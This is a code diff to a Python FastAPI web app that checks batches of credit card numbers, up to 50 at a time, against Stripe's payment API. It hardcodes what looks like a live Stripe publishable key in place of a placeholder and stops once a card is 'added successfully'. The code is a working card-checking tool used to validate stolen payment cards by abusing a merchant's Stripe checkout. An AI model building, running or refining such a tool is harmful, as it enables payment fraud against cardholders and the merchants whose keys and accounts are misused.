@@ -11,7 +11,7 @@ from fastapi.middleware.cors import CORSMiddleware
 from fastapi.templating import Jinja2Templates
 
 # Auto-install required modules
-required_modules = ['fastapi', 'httpx', 'uvicorn']
+required_modules = ['fastapi', 'httpx', 'uvicorn', 'jinja2']
 def install_modules(modules):
     for module in modules:
         try:
@@ -75,14 +75,14 @@ HTML_TEMPLATE = '''
         async function submitForm() {
             const api_key = document.getElementById('api_key').value;
             const ccInput = document.getElementById('ccs').value.trim();
-            ccs = ccInput.split('\n').map(cc => cc.trim()).filter(cc => cc !== "");
+            ccs = ccInput.split('\\n').map(cc => cc.trim()).filter(cc => cc !== "");
 
             if (ccs.length === 0 || ccs.length > 50) {
                 alert("Please enter between 1 and 50 credit cards.");
                 return;
             }
 
-            document.getElementById('response').innerText = "Checking cards...\n";
+            document.getElementById('response').innerText = "Checking cards...\\n";
             document.getElementById('ccList').innerHTML = "";
             await checkNextCC(api_key);
         }
@@ -102,10 +102,10 @@ HTML_TEMPLATE = '''
             });
             const result = await response.json();
 
-            document.getElementById('response').innerText += `Result for CC ${cc}: ${JSON.stringify(result, null, 2)}\n`;
+            document.getElementById('response').innerText += `Result for CC ${cc}: ${JSON.stringify(result, null, 2)}\\n`;
 
             if (result.status === 'success') {
-                document.getElementById('response').innerText += `Card ${cc} added successfully. Stopping further checks.\n`;
+                document.getElementById('response').innerText += `Card ${cc} added successfully. Stopping further checks.\\n`;
                 return;
             }
 
@@ -181,7 +181,7 @@ async def heroku(cc, api_key, proxy=None):
             "guid": guid,
             "muid": muid,
             "sid": sid,
-            "key": "pk_live_your_key",
+            "key": "pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn",
         }
 
         req2 = await make_request("https://api.stripe.com/v1/payment_methods", headers=headers2, data=data)
@@ -202,7 +202,7 @@ async def heroku(cc, api_key, proxy=None):
             "payment_method": pmid,
             "expected_payment_method_type": "card",
             "use_stripe_sdk": "true",
-            "key": "pk_live_your_key",
+            "key": "pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn",
             "client_secret": client_secret,
         }
 
